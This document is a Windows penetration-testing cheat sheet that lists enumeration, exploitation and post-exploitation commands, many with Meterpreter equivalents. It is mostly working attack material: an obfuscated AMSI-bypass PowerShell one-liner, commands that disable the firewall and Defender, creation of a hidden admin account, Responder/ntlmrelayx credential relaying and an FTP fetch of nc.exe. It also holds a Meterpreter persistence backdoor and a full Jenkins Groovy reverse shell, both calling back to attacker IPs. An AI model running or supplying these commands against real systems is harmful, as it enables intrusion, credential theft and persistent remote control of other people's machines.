Information Gathering:
	1. Get System information
		>systeminfo
		>sysinfo (meterpreter)

	2. Get Current Directory
		>echo %cd%
		>pwd (meterpreter)

	3. Get Current User
		>echo %username% or whoami
		>getuid (meterpreter)

	4. Show Current User Privileges 
		>whoami /priv
		>run post/windows/gather/win_privs (meterpreter)

	5. Find a File or Service
		>where
		>search -h; -d for directory (meterpreter)

	6. Show Running services:
		>wmic service list brief
		>run post/windows/gather/enum_services (meterpreter)

	7. Show Installed Applications
		>net start
		>run post/windows/gather/enum_applications (meterpreter)

	8. Show Process Tree:
		>tasklist
		>ps (meterpreter)

	9. Show Users' User Groups:
		>net user <username>

	10.Check Windows Patching:
		>wmic qfe get Caption,Description,HotFixID,InstalledOn

	11.Enumerate AD Domains:
		>net view /domains or net group "Domain Controllers" domain
		>run post/windows/gather/enum_domains (meterpreter)

	12.Enumerate AD Users:
		>net user /domain
		>run post/windows/gather/enum_ad_users (meterpreter)

	13. List Available Shares:
		>net share
		>run post/windows/gather/enum_shares (meterpreter)

	14. Show Computer Groups
		>net localgroup

	15. Show User Group Association
		>net localgroup <groupname>

	16. Show Logged On Users:
		From elevated Powershell: Get-Process -IncludeUserName | Select-Object -Unique -Property UserName
		>run post/windows/gather/enum_logged_on_users
		Note: "query user" works on Win10 Pro

	17. LDAP Enumeration:
		From Kali - nslookup -type=srv _ldap._tcp.els.bank | grep ldap | cut -d ' ' -f 6 | sed 's/\.$//g'


Network Mapping
	1. Gather Network Interface Info
		>ipconfig /all
		>ifconfig (meterpreter)

	2. Gather Routing Table Information
		>route print
		>route (meterpreter)

	3. ARP Table Information
		>arp -a
		>arp (meterpreter)

	4. Gather Network Connections
		>netstat -ano
		>netstat (meterpreter)

	5. Show DNS information
		>ipconfig /displaydns


Exploitation
	1. Create New User (if privileged)
		>net user <username> <password> /add 
		Note: Append /domain to modify domain account

	2. Modify User Privileges
		>net localgroup "Administrators" <username> /add
		Note: Append /domain to modify domain account

	3. Auto-Escalate Privileges:
		>getsystem (meterpreter)

	4. Check Unquoted Service Paths:
		>wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """

	5. Check Service Status:
		>sc query servicename

	6. Check Auto Run Programs and Services
		>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

	7. PrintNightmare	

	8. Responder /ntlmrelayx
		>responder -I eth0 -rdwP
		>./ntlmrelayx -tf targets -smb2support -i
		


Post Exploitation
	1. Gather Available Credentials
		>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
		>run post/windows/gather/credentials/credential_collector (meterpreter)
		Note: Also see Mimikatz

	2. Create New User with Admin Privileges:
		>net user <username> <password> /add && net localgroup "administrators" <username> /add

	3. Enable RDP on Machine:
		-> Enable Remote Desktop and Enable Firewall Rule:
			>Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

		-> Enable Remote Desktop:
			>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 

		-> Disable Remote Desktop and Disable Firewall Rule:
			>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"

		>run getgui -e (meterpreter)

	4. Check Firewall Status:
		>netsh advfirewall show currentprofile

	5. Disable Firewall:
		>netsh advfirewall set allprofiles state off

	6. Disable Antivirus:
		Powershell: Set-MpPreference -DisableRealtimeMonitoring $true
		>$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

	7. Check Scheduled Tasks:
		>schtasks /query /fo LIST /v

	8. Check AutoRun Programs and Service
		>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

	9. Persistent Backdoor
		>run persistence -A -X -i 5 -p 8080 -r ipaddr (meterpreter)
			Note: -A starts handler; -X starts at boot; -i 5 attempts every 5 sec; -p port -r is our IP address

	10. Grant Admin Permissions to Directories:
		>icacls Administrator\Desktop /grant james:(OI)(CI)F /T

	11. Autologin Credentials:
		>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

	12. FTP File Transfer:
			-> On the Windows Machine:
				echo open localIP 21> ftp.txt&echo USER anonymous >> ftp.txt& echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe >>ftp.txt&echo bye>> ftp.txt
			-> On your Kali Machine in a tools directory or wherever the file is, start an FTP Server:
				python -m pyftpdlib -p 21 -w
			-> On windows, run:
				python -m pyftpdlib -p 21 -w

			-> The file should transfer. This works on older version of Windows where Powershell or Certutil may not be functional.

	13. Jenkins Reverse Shell:
			-> Jenkins exploitation - From Script Console, run:
				String host="10.6.2.56";																						
				int port=8044;
				String cmd="cmd.exe"																							
				Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();																																					
			Note: Switch cmd.exe for /bin/bash if Jenkins runs on Linux.


